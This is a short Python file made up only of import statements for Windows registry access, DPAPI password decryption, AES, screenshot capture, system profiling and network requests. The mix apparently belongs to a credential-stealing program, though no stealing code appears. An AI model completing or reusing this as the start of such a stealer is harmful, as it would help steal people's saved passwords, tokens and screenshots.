import requests
import os
import subprocess
import winreg
import winreg as reg
import shutil
import json
import zipfile
import io
import psutil
import platform
import threading
import time
import sys
import socket
import ctypes
import uuid
import wmi

from datetime           import datetime
from base64             import b64decode
from Crypto.Cipher      import AES
from win32crypt         import CryptUnprotectData
from os                 import getlogin, listdir, getenv
from json               import loads
from re                 import findall
from urllib.request     import Request, urlopen
from subprocess         import Popen, PIPE
from PIL                import ImageGrab